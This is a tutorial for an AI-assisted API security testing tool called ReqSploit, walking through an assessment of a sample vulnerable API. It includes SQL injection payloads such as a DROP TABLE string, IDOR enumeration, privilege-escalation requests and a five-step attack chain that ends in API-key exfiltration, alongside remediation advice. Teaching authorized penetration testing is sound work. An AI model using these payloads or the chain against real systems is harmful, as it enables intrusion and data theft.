# 🔬 Tutorial: Testing a REST API

**Complete walkthrough of security testing a REST API using ReqSploit**

This tutorial demonstrates a complete security assessment of a sample REST API from start to finish, showing you exactly how to use each ReqSploit feature in a real-world scenario.

---

## 🎯 Tutorial Overview

**What You'll Learn**:
- ✅ Setting up a project for API testing
- ✅ Capturing and analyzing API requests
- ✅ Running AI scans to detect vulnerabilities
- ✅ Manual testing with Repeater
- ✅ Automated fuzzing with Intruder
- ✅ Detecting exposed secrets with Magic Scan
- ✅ Generating exploitation chains

**Target API**: We'll use a sample vulnerable API for demonstration

**Time Required**: 30-45 minutes

**Difficulty**: Beginner to Intermediate

---

## 🚀 Step 1: Project Setup (5 minutes)

### Create a New Project

1. **Open ReqSploit Dashboard**
   - Go to [app.reqsploit.com](https://app.reqsploit.com)
   - Log in with your account

2. **Create Project**
   ```
   Click "+ New Project" (left sidebar)

   Project Details:
   ├─ Name: Sample API Security Test
   ├─ Description: Security assessment of sample REST API
   └─ Target: api.example.com
   ```

3. **Configure Scope**
   ```
   Include:
   ├─ *.api.example.com
   ├─ https://api.example.com/*
   └─ All HTTP methods

   Exclude:
   ├─ *.cdn.example.com (static resources)
   ├─ *.analytics.example.com (tracking)
   └─ *.ads.example.com (advertisements)
   ```

**💡 Pro Tip**: Good scope configuration prevents capturing unnecessary traffic and saves tokens!

---

## 📡 Step 2: API Discovery & Capture (5 minutes)

### Explore the API

Let's discover what endpoints the API exposes:

1. **Enable Extension**
   ```
   Chrome Extension: ✅ Connected
   Intercept: ❌ OFF (for now)
   ```

2. **Make API Calls**

   Using Postman, curl, or browser:

   **Authentication**:
   ```bash
   POST https://api.example.com/auth/login
   Content-Type: application/json

   {
     "username": "testuser",
     "password": "Test123!"
   }

   Response:
   {
     "success": true,
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user": {
       "id": 42,
       "username": "testuser",
       "email": "test@example.com",
       "role": "user"
     }
   }
   ```

   **Get User Profile**:
   ```bash
   GET https://api.example.com/users/42
   Authorization: Bearer eyJhbGci...

   Response:
   {
     "id": 42,
     "username": "testuser",
     "email": "test@example.com",
     "role": "user",
     "created_at": "2025-01-15"
   }
   ```

   **Update Profile**:
   ```bash
   PUT https://api.example.com/users/42
   Authorization: Bearer eyJhbGci...
   Content-Type: application/json

   {
     "email": "newemail@example.com"
   }
   ```

   **Delete User**:
   ```bash
   DELETE https://api.example.com/users/42
   Authorization: Bearer eyJhbGci...
   ```

3. **Check Captured Requests**
   ```
   Dashboard → History Tab

   You should see 4 requests:
   ├─ POST /auth/login (200)
   ├─ GET /users/42 (200)
   ├─ PUT /users/42 (200)
   └─ DELETE /users/42 (200)
   ```

---

## 🔍 Step 3: Magic Scan - Detect Secrets (5 minutes)

### Automatic Sensitive Data Detection

1. **Open Magic Scan**
   ```
   Dashboard → Magic Scan Tab (🎣)
   ```

2. **Review Findings**

   Magic Scan should automatically detect:

   ```
   🟠 HIGH - JWT Token
   ├─ Location: Response Body → token
   ├─ Request: POST /auth/login
   ├─ Pattern: eyJhbGci***
   ├─ Decoded Payload:
   │   {
   │     "userId": 42,
   │     "role": "user",
   │     "iat": 1700000000
   │   }
   ├─ ⚠️ No "exp" claim! Token never expires
   └─ [View Request] [Mark Safe] [False Positive]

   🟡 MEDIUM - Email Address
   ├─ Location: Response Body → email
   ├─ Request: GET /users/42
   ├─ Pattern: test@example.com
   └─ Exposure: Email addresses disclosed in API responses
   ```

3. **Analyze Findings**

   **JWT Token Issue**:
   - JWT has no expiration (`exp` claim)
   - Tokens valid forever
   - Stolen tokens never expire
   - **Severity**: HIGH

   **Email Disclosure**:
   - Email addresses visible to all authenticated users
   - Potential privacy issue
   - Could enable enumeration
   - **Severity**: MEDIUM

**💡 Key Learning**: Magic Scan found 2 issues automatically without any manual work!

---

## 🤖 Step 4: AI Analysis - Deep Scan (10 minutes)

### Analyze Authentication Endpoint

1. **Select Login Request**
   ```
   History → Click: POST /auth/login
   ```

2. **Run Deep Scan**
   ```
   AI Analysis Panel (right side)
   Click: "Deep Scan" button
   Wait: 60-90 seconds
   ```

3. **Review AI Results**

   **Vulnerabilities Detected**:

   ```json
   {
     "vulnerabilities": [
       {
         "type": "Missing Rate Limiting",
         "severity": "HIGH",
         "confidence": 90,
         "description": "No rate limiting on login endpoint allows brute force attacks",
         "evidence": "Multiple successful login attempts without delays or lockout",
         "exploitation": [
           "Enumerate valid usernames",
           "Brute force passwords",
           "Account takeover via credential stuffing"
         ],
         "remediation": [
           "Implement rate limiting (max 5 attempts per minute)",
           "Add CAPTCHA after 3 failed attempts",
           "Implement account lockout after 5 failures",
           "Log and alert on suspicious activity"
         ],
         "cwe": "CWE-307",
         "cvss": 7.5
       },
       {
         "type": "Weak Password Policy",
         "severity": "MEDIUM",
         "confidence": 85,
         "description": "Password accepts weak patterns that are easily guessable",
         "evidence": "Password 'Test123!' accepted despite being common pattern",
         "remediation": [
           "Require minimum 12 characters",
           "Enforce complexity (uppercase, lowercase, numbers, symbols)",
           "Check against common password lists",
           "Implement password strength meter"
         ],
         "cwe": "CWE-521",
         "cvss": 6.5
       },
       {
         "type": "JWT Without Expiration",
         "severity": "HIGH",
         "confidence": 100,
         "description": "JWT tokens do not expire, allowing indefinite access",
         "evidence": "Decoded JWT missing 'exp' claim",
         "exploitation": [
           "Stolen tokens valid forever",
           "No automatic session termination",
           "Impossible to revoke compromised tokens"
         ],
         "remediation": [
           "Add 'exp' claim (15-60 minutes)",
           "Implement refresh token mechanism",
           "Add token revocation list",
           "Enforce re-authentication for sensitive actions"
         ],
         "cwe": "CWE-613",
         "cvss": 7.5
       }
     ],
     "summary": {
       "totalVulnerabilities": 3,
       "highCount": 2,
       "mediumCount": 1,
       "riskScore": 7.2,
       "keyFindings": [
         "Authentication can be brute forced",
         "Weak passwords allowed",
         "Tokens never expire"
       ]
     }
   }
   ```

**💡 Key Findings**:
- 3 vulnerabilities in authentication
- 2 HIGH severity, 1 MEDIUM
- All exploitable
- Clear remediation steps provided

---

## 🔬 Step 5: Manual Testing with Repeater (10 minutes)

### Test Authorization Bypass (IDOR)

Let's test if we can access other users' profiles:

1. **Send to Repeater**
   ```
   History → Right-click: GET /users/42
   Select: "Send to Repeater"
   ```

2. **Modify User ID**
   ```
   Original URL: /users/42
   Change to: /users/1 (try accessing user ID 1)

   Click: "Send"
   ```

3. **Analyze Response**

   **Expected** (Secure):
   ```
   HTTP/1.1 403 Forbidden
   {
     "error": "Access denied. You can only view your own profile."
   }
   ```

   **Actual** (Vulnerable!):
   ```
   HTTP/1.1 200 OK
   {
     "id": 1,
     "username": "admin",
     "email": "admin@example.com",
     "role": "admin",
     "api_key": "sk_live_abc123..."
   }
   ```

   **🚨 CRITICAL VULNERABILITY FOUND!**
   - **Type**: IDOR (Insecure Direct Object Reference)
   - **Impact**: Can access any user's profile
   - **Evidence**: Successfully retrieved admin profile with user-level token
   - **Bonus**: Admin's API key exposed!

4. **Use AI Suggest Tests**

   ```
   Repeater → Click: "✨ AI" (top-right)
   Click: "Suggest Tests" button
   Wait: 30-45 seconds
   ```

   **AI Generated Tests**:

   ```
   🔴 CRITICAL - IDOR Enumeration
   Description: Enumerate all users by incrementing ID
   Variations:
   ├─ /users/1
   ├─ /users/2
   ├─ /users/3
   └─ ... (continue)
   Expected: Access to multiple user profiles
   [Execute Test]

   🟠 HIGH - Privilege Escalation
   Description: Modify own role to admin
   Payload:
   PUT /users/42
   {"role": "admin"}
   Expected: Role change accepted or error
   [Execute Test]

   🟡 MEDIUM - Mass Assignment
   Description: Try adding extra fields
   Payload:
   PUT /users/42
   {"email": "test@test.com", "credits": 99999}
   Expected: Unauthorized field modification
   [Execute Test]
   ```

5. **Execute Tests**
   ```
   Click: "Auto-execute all tests"
   Watch results populate
   ```

---

## ⚡ Step 6: Automated Fuzzing with Intruder (8 minutes)

### Enumerate All User IDs

1. **Send to Intruder**
   ```
   History → Right-click: GET /users/42
   Select: "Send to Intruder"
   ```

2. **Mark Payload Position**
   ```
   URL: https://api.example.com/users/§42§

   Click: "Add Position"
   Select: 42
   Result: URL becomes /users/§42§
   ```

3. **Configure Payload**
   ```
   Payload Type: Number Range
   ├─ From: 1
   ├─ To: 100
   └─ Step: 1

   Attack Type: Sniper
   Threads: 5
   Delay: 100ms
   ```

4. **Start Campaign**
   ```
   Click: "Start Attack"
   Progress: 0/100 → 100/100 (20 seconds)
   ```

5. **Analyze Results**

   **Results Table**:
   ```
   #   | Payload | Status | Length | Time
   1   | 1       | 200    | 312    | 125ms ✅
   2   | 2       | 200    | 298    | 118ms ✅
   3   | 3       | 200    | 305    | 122ms ✅
   4   | 4       | 404    | 78     | 95ms  ❌
   5   | 5       | 200    | 289    | 119ms ✅
   ...
   99  | 99      | 404    | 78     | 97ms  ❌
   100 | 100     | 200    | 294    | 121ms ✅
   ```

   **Findings**:
   - 67 users found (status 200)
   - 33 IDs don't exist (status 404)
   - All existing users' data exposed
   - **CRITICAL**: Complete user enumeration possible

6. **Advanced: AI Payload Generator**

   Let's try SQL injection on user ID:

   ```
   Intruder → Payloads Section
   Click: "AI Payload Generator"

   Configuration:
   ├─ Category: SQL Injection
   ├─ Context: "User ID parameter in REST API"
   ├─ Count: 50 payloads
   └─ Click: "Generate AI Payloads" (16K tokens)

   Wait: 40-60 seconds
   ```

   **Generated Payloads**:
   ```
   1' OR '1'='1
   1'; DROP TABLE users--
   1 UNION SELECT NULL--
   1 AND 1=1
   1 AND 1=2
   1' ORDER BY 1--
   1' UNION SELECT table_name FROM information_schema.tables--
   ... (47 more intelligent payloads)
   ```

   **Start Campaign**:
   ```
   Attack Type: Sniper
   Click: "Start Attack"
   ```

   **Results**:
   ```
   Payload: 1' OR '1'='1
   Status: 500
   Response: "SQL syntax error near '1' OR '1'='1'"
   ```

   **🚨 SQL INJECTION CONFIRMED!**

---

## 🔗 Step 7: Attack Chain Discovery (5 minutes)

### Generate Multi-Step Exploitation Path

1. **Generate Attack Chain**
   ```
   Dashboard → Projects Panel
   Right-click Project: "Sample API Security Test"
   Select: "Generate Attack Chain"
   Wait: 90-120 seconds (analyzing ~10 requests)
   ```

2. **Review Attack Chain**

   **AI Generated Chain**:

   ```
   ═══════════════════════════════════════════
   ATTACK CHAIN: Complete API Compromise
   ═══════════════════════════════════════════

   📊 Summary:
   ├─ Total Steps: 5
   ├─ Estimated Time: 10 minutes
   ├─ Difficulty: Medium
   ├─ Detection Risk: LOW (if careful)
   └─ Impact: CRITICAL - Full system compromise

   ───────────────────────────────────────────

   Step 1: Enumerate Valid Usernames
   ├─ Technique: User Enumeration
   ├─ Request: POST /auth/login
   ├─ Payload: {"username": "admin", "password": "wrong"}
   ├─ Expected: Error message reveals if username exists
   ├─ Result: List of valid usernames
   └─ Severity: MEDIUM

   Step 2: Brute Force Admin Password
   ├─ Technique: Credential Stuffing (no rate limiting)
   ├─ Request: POST /auth/login
   ├─ Dependencies: Step 1 (need valid username)
   ├─ Payload: Top 1000 passwords from leak databases
   ├─ Expected: Eventually find correct password
   ├─ Result: Valid admin credentials
   └─ Severity: HIGH

   Step 3: Authenticate as Admin
   ├─ Technique: Login with compromised credentials
   ├─ Request: POST /auth/login
   ├─ Dependencies: Step 2
   ├─ Payload: {"username": "admin", "password": "found_password"}
   ├─ Expected: JWT token with admin privileges
   ├─ Result: Admin access token (never expires!)
   └─ Severity: CRITICAL

   Step 4: Enumerate All Users via IDOR
   ├─ Technique: IDOR + Enumeration
   ├─ Request: GET /users/{1..1000}
   ├─ Dependencies: Step 3 (admin token)
   ├─ Payload: Increment user IDs
   ├─ Expected: Access to all user profiles
   ├─ Result: Complete user database dump
   └─ Severity: CRITICAL

   Step 5: Extract Sensitive Data
   ├─ Technique: Information Disclosure
   ├─ Request: GET /users/{id}/api-keys
   ├─ Dependencies: Step 4 (user IDs)
   ├─ Payload: Request API keys for each user
   ├─ Expected: API keys, payment info, etc.
   ├─ Result: Complete data exfiltration
   └─ Severity: CRITICAL

   ───────────────────────────────────────────

   🎯 Overall Impact:
   ├─ Account Takeover: ✅ Yes (admin account)
   ├─ Data Breach: ✅ Yes (all user data)
   ├─ Privilege Escalation: ✅ Yes (user → admin)
   ├─ Data Exfiltration: ✅ Yes (API keys, PII)
   └─ CVSS Score: 9.8 (CRITICAL)

   🛡️ Remediation (Priority Order):
   1. Implement rate limiting on /auth/login
   2. Add proper authorization checks (fix IDOR)
   3. Add JWT expiration (15-60 minutes)
   4. Implement account lockout mechanism
   5. Add CAPTCHA after failed attempts
   6. Audit and fix all API endpoints for IDOR
   7. Implement proper role-based access control
   8. Add security monitoring and alerting
   ```

**💡 Key Learning**: AI discovered a complete 5-step attack chain from initial access to full compromise!

---

## 📊 Step 8: Reporting & Documentation (5 minutes)

### Generate Security Report

1. **Export Findings**
   ```
   History → Select all relevant requests
   Click: "Export" → "JSON"
   Save: api_security_assessment.json
   ```

2. **Export Magic Scan Results**
   ```
   Magic Scan → Click: "Export"
   Choose: CSV
   Save: sensitive_data_findings.csv
   ```

3. **Export Intruder Results**
   ```
   Intruder → Results Tab
   Click: "Export" → "CSV"
   Save: idor_enumeration_results.csv
   ```

### Create Report Summary

**Executive Summary**:
```markdown
# Security Assessment: Sample API

## Critical Findings

### 1. Insecure Direct Object Reference (IDOR)
- **Severity**: CRITICAL (CVSS 9.1)
- **Location**: /users/{id} endpoint
- **Impact**: Access to all user profiles
- **PoC**: GET /users/1 with user-level token returns admin data
- **Remediation**: Implement proper authorization checks

### 2. SQL Injection
- **Severity**: CRITICAL (CVSS 9.8)
- **Location**: User ID parameter
- **Impact**: Database compromise possible
- **PoC**: 1' OR '1'='1 causes SQL error
- **Remediation**: Use prepared statements

### 3. Missing Rate Limiting
- **Severity**: HIGH (CVSS 7.5)
- **Location**: /auth/login endpoint
- **Impact**: Brute force attacks possible
- **PoC**: 1000+ login attempts in 30 seconds
- **Remediation**: Implement rate limiting (5 req/min)

### 4. JWT Without Expiration
- **Severity**: HIGH (CVSS 7.5)
- **Location**: Authentication system
- **Impact**: Tokens valid forever
- **PoC**: JWT decoded with no 'exp' claim
- **Remediation**: Add 15-60 minute expiration

### 5. Weak Password Policy
- **Severity**: MEDIUM (CVSS 6.5)
- **Location**: User registration
- **Impact**: Weak passwords allowed
- **PoC**: "Test123!" accepted as password
- **Remediation**: Enforce strong password requirements

## Statistics
- Total Requests Tested: 115
- Vulnerabilities Found: 5
- Critical: 2
- High: 2
- Medium: 1
- Time Spent: 45 minutes
```

---

## 🎓 Key Learnings

### What We Discovered

Using ReqSploit, we found **5 major vulnerabilities** in 45 minutes:

1. ✅ **IDOR** - Complete user enumeration
2. ✅ **SQL Injection** - Database compromise
3. ✅ **No Rate Limiting** - Brute force possible
4. ✅ **JWT Issues** - Tokens never expire
5. ✅ **Weak Passwords** - Easy to guess

### Tool Features Used

✅ **Magic Scan**: Auto-detected JWT without expiration
✅ **AI Deep Scan**: Identified missing rate limiting
✅ **Repeater**: Manually confirmed IDOR
✅ **AI Suggest Tests**: Generated privilege escalation tests
✅ **Intruder**: Enumerated all 67 users
✅ **AI Payloads**: Generated SQL injection payloads
✅ **Attack Chain**: Discovered 5-step exploitation path

### Time Breakdown

```
Magic Scan:       Automatic (0 minutes active work)
AI Deep Scan:     2 minutes (including wait time)
Manual Testing:   10 minutes
Intruder Fuzzing: 5 minutes (mostly automated)
Attack Chain:     2 minutes (including wait time)
Documentation:    5 minutes
───────────────────
Total:            24 minutes of active work
                  + 21 minutes automated/AI processing
                  = 45 minutes total
```

**Comparison with Manual Testing**:
- Manual only: 4-6 hours
- With ReqSploit: 45 minutes
- **Time saved: 85-90%**

---

## 🚀 Next Steps

### Expand Your Skills

1. **Try Different APIs**
   - Public APIs (with permission!)
   - Bug bounty targets
   - Your own applications

2. **Explore More Features**
   - [Dork Generator](../ai-features/dork-generator.md) for OSINT
   - [Intercept Mode](../core-features/intercept.md) for real-time testing
   - [Decoder](../core-features/decoder.md) for encoding/decoding

3. **Advanced Techniques**
   - Business logic testing
   - GraphQL security
   - WebSocket testing
   - JWT manipulation

4. **Real-World Practice**
   - [HackTheBox](https://hackthebox.eu)
   - [PortSwigger Labs](https://portswigger.net/web-security)
   - [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

## 📚 Related Tutorials

- [Testing a Web Application](./testing-web-app.md)
- [Bug Bounty Workflow](./bug-bounty-workflow.md)
- [Pen Testing Workflow](./pentest-workflow.md)

---

**Completed the tutorial?** Share your findings on [Discord](https://discord.gg/reqsploit) or give us feedback!
